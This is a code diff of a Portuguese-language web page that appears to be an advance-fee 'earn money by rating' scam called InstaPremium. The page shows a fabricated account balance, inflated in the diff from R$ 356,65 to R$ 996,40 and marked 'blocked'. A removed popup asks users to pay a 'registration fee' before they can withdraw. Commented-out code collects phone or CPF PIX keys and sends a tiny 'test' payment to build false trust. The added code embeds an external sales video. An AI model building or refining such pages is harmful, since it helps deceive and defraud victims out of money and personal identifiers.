@@ -70,43 +70,22 @@ src="https://www.facebook.com/tr?id=494913433675653&ev=PageView&noscript=1"
         }
 
         function gerarPix() {
-            $('.pop').removeClass('d-none');
-            // //INTEGRAÇÃO AQUI
-            // if (option == 'phone') {
-            //     localStorage.setItem('pix', $('.phone').val());
-            //     var pixKey = '+55' + $('.phone').val().replace(/\D/g,'');
-            // } else {
-            //     localStorage.setItem('pix', $('.cpf').val());
-            //     var pixKey = $('.cpf').val().replace(/\D/g,'');
-            // }
-
-            // var url = 'https://api.primepag.com.br/v1/pix/payments';
-            // var uniqueId = generateUniqueId();
-            // var data =   {
-            //     "initiation_type": "dict", 
-            //     "idempotent_id": uniqueId, 
-            //     "receiver_name": "John Doe", 
-            //     "value_cents": 5,
-            //     "pix_key_type": option,
-            //     "pix_key": pixKey,
-            //     "authorized": true
-            // }
-
-            // $.ajax({
-            //     url: 'https://cupom-server-3857a533d564.herokuapp.com/api/payment-2',
-            //     type: 'POST',
-            //     contentType: 'application/json',
-            //     data: JSON.stringify(data),
-            //     success: function(response) {
-            //         $('.pop').removeClass('d-none');
-
-            //         console.log(response, data)
-            //     },
-            //     error: function(response) {
-            //         console.log(response, data)
-            //         alert('Erro ao gerar pix.')
-            //     }
-            // });
+            if ($('.phone').val().length > 4 || $('.cpf').val().length > 4) {
+                $('.pop').removeClass('d-none');
+                var playerDiv = '<div id="vid_663015f6ef68be000c95679b" style="position:relative;width:100%;padding:56.25% 0 0;">' +
+            '<img id="thumb_663015f6ef68be000c95679b" src="https://images.converteai.net/e41c52c0-1591-4eaf-8d8f-6bb645a4e0b7/players/663015f6ef68be000c95679b/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;">' +
+            '<div id="backdrop_663015f6ef68be000c95679b" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div>' +
+            '</div>';
+        
+                    var script = '<script type="text/javascript" id="scr_663015f6ef68be000c95679b">' +
+            'var s=document.createElement("script");' +
+            's.src="https://scripts.converteai.net/e41c52c0-1591-4eaf-8d8f-6bb645a4e0b7/players/663015f6ef68be000c95679b/player.js";' +
+            's.async=true;' +
+            'document.head.appendChild(s);';
+                    $('.vtub').html(playerDiv + script);
+                    } else {
+                        alert('Preencha o pix')
+            }
         };
         function generateUniqueId() {
             // Gera um número aleatório entre 0 e 9999999999
@@ -151,28 +130,22 @@ src="https://www.facebook.com/tr?id=494913433675653&ev=PageView&noscript=1"
   <body>
     <header>
       <img src="./logo.svg" alt="" style="width: 150px;">
-      <span class="saldo">R$ 356,65</span>
+      <span class="saldo">R$ 996,40</span>
     </header>
-    <div class="pop-2 d-none">
-        <div class="pop-out-foto">
-            <img src="gold-coin-money-symbol-icon-png.png" style="margin: 30px 0px;" alt="">
-            <p style="font-size: 15px; font-weight: bold; color: #4ADE80;">Você recebeu o seu saque teste </p>
-            <div style="background-color: #202020; padding: 10px 3px; margin: 20px; border-radius: 8px;">Verifique suas notificações ou extrato bancário!</div>
-            <p style="font-size: 15px;">Agora basta realizar mais 3 avaliações para realizar seu<span style="color: #8D51FE; font-weight: 600;"> PRIMEIRO SAQUE COMPLETO!</span> </p>
-            <a class="btn-pop-out-foto" href="foto4.html">CONTINUAR</a>
-        </div>
+    <div class="pop d-none">
+        <div class="pop-out-foto" style="border: 1px solid grey; padding: 10px 15px;">
+            <div class="bloqueado">
+              <h3 style="margin: 10px 0px;">Veja o vídeo com atenção antes de sacar.</h3>
+              <h3 style="color: red; padding-top: 5px 0px;">SALDO BLOQUEADO</h3>
+              <h1 style="font-size: 37px; color: #139A05; font-weight: bold; padding: 5px 0px;">R$ 996,40</h1>
+            </div>
+            <div class="vtub" style="width: 100%;">
+                
+            </div>
+            <button class="btn btn-share mt-3" style="border: 0px; font-weight: bold; margin-top: 20px" onclick="window.location.href = 'https://google.com.br'">CONCLUIR SAQUE</button>
+          </div>
     </div>
 
-    <div class="pop d-none">
-        <div class="pop-out-foto">
-            <img src="alert-icon-red-11.png" style="margin: 30px 0px; width: 100px; height: 100px;" alt="">
-            <p style="font-size: 15px;">O seu saque foi <b>QUASE</b> finalizado! </p>
-            <p style="font-size: 15px; margin: 10px 0px;">Para continuar lucrando com o InstaPremium e finalizar seu saque de <br /> <span style="color: #05d150; font-weight: 600; font-size: 25px;">R$ 356,65</span> </p>
-            <p style="font-size: 15px; ">Pague apenas a taxa de cadastro!</p>
-            <div style="background-color: #f9d0efa4; padding: 10px 3px; margin: 10px; border-radius: 8px; font-size: 14px;">Fique tranquilo(a)! Você receberá esse valor na sua conta após a <span style="color: #08903a; font-weight: 600;">confirmação do seu cadstro</span> </div>
-            <button class="btn-pop-out-foto sacar" onclick="window.location.href='google.com'" style="font-weight: bold;">CONCLUIR CADASTRO E SACAR</button>
-        </div>
-    </div>
     <div class="post">
         <div class="container" style="padding-top: 100px; margin: 0px 3%;">
             <div class="card">
